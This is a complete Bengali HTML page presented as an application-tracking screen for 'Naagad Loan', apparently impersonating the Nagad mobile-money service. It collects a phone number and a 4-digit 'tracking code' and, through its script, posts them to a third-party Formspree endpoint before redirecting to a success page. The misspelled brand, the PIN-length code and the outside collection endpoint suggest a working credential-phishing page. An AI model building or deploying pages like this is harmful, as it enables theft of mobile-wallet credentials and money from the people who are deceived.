<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>আবেদন ট্র্যাকিং - Naagad Loan</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: #f1f5f9; 
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }
        .screen-container {
            width: 100%;
            max-width: 450px;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 20px rgba(0,0,0,0.06);
        }
        .top-accent {
            height: 16px;
            background: linear-gradient(90deg, #ff4e00, #ff8c00);
            width: 100%;
        }
        .header-title-box {
            padding: 25px 20px 10px;
            text-align: center;
            position: relative;
        }
        .back-btn {
            position: absolute;
            left: 20px;
            top: 25px;
            background: none;
            border: none;
            font-size: 18px;
            color: #475569;
            cursor: pointer;
            text-decoration: none;
        }
        .header-title-box h2 {
            font-size: 22px;
            color: #1e293b;
            margin-bottom: 5px;
        }
        .header-title-box p {
            font-size: 13px;
            color: #64748b;
        }
        .form-body {
            padding: 20px;
            flex-grow: 1;
        }
        .info-badge {
            background: #eff6ff;
            border: 1px solid #bfdbfe;
            color: #1d4ed8;
            padding: 12px 14px;
            border-radius: 10px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 22px;
        }
        .input-group { margin-bottom: 18px; }
        .input-label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            font-weight: bold;
            color: #475569;
            margin-bottom: 8px;
        }
        .input-label i { color: #ff6a00; }
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .field-icon {
            position: absolute;
            left: 15px;
            color: #64748b;
            font-size: 16px;
        }
        .input-field {
            width: 100%;
            padding: 14px 16px 14px 46px;
            background: #f8fafc;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            color: #1e293b;
            outline: none;
            transition: all 0.2s;
        }
        .input-field:focus {
            background: #ffffff;
            border-color: #ff6a00;
        }
        .tracking-box {
            letter-spacing: 6px;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            padding-left: 16px;
        }
        .submit-btn {
            width: 100%;
            margin-top: 15px;
            padding: 15px;
            background: linear-gradient(90deg, #ff7a00, #ff3400);
            color: #ffffff;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 68, 0, 0.3);
        }
        .submit-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="screen-container">
    <div class="top-accent"></div>

    <div class="header-title-box">
        <a href="./loan.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <h2>আবেদন ট্র্যাকিং</h2>
        <p>আপনার আবেদনের বর্তমান অবস্থা যাচাই করুন</p>
    </div>

    <div class="form-body">
        <div class="info-badge">
            <i class="fa-solid fa-circle-info"></i>
            <span>আবেদনের সময় প্রাপ্ত ৪ সংখ্যার ট্র্যাকিং নম্বরটি দিন</span>
        </div>

        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
            <div class="input-group">
                <label class="input-label"><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-mobile-screen field-icon"></i>
                    <input type="tel" name="মোবাইল_নম্বর" class="input-field" required placeholder="০১XXXXXXXXX">
                </div>
            </div>

            <div class="input-group">
                <label class="input-label"><i class="fa-solid fa-hashtag"></i> ট্র্যাকিং কোড (৪ ডিজিট)</label>
                <div class="input-wrapper">
                    <input type="text" name="ট্র্যাকিং_কোড" class="input-field tracking-box" maxlength="4" pattern="[0-9]{4}" required placeholder="####">
                </div>
            </div>

            <button type="submit" id="submitBtn" class="submit-btn">
                <span>যাচাই সম্পন্ন করুন</span>
                <i class="fa-solid fa-arrow-right"></i>
            </button>
        </form>
    </div>
</div>

<script>
    const form = document.getElementById("verifyForm");
    const submitBtn = document.getElementById("submitBtn");

    form.addEventListener("submit", async function(event) {
        event.preventDefault();
        
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';

        const data = new FormData(form);

        try {
            const response = await fetch(form.action, {
                method: "POST",
                body: data,
                headers: {
                    'Accept': 'application/json'
                }
            });

            if (response.ok) {
                window.location.href = "./success.html";
            } else {
                alert("দুঃখিত, তথ্য যাচাই করা যায়নি। আবার চেষ্টা করুন।");
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<span>যাচাই সম্পন্ন করুন</span> <i class="fa-solid fa-arrow-right"></i>';
            }
        } catch (error) {
            alert("ইন্টারনেট সংযোগ চেক করে পুনরায় চেষ্টা করুন।");
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span>যাচাই সম্পন্ন করুন</span> <i class="fa-solid fa-arrow-right"></i>';
        }
    });
</script>

</body>
</html>
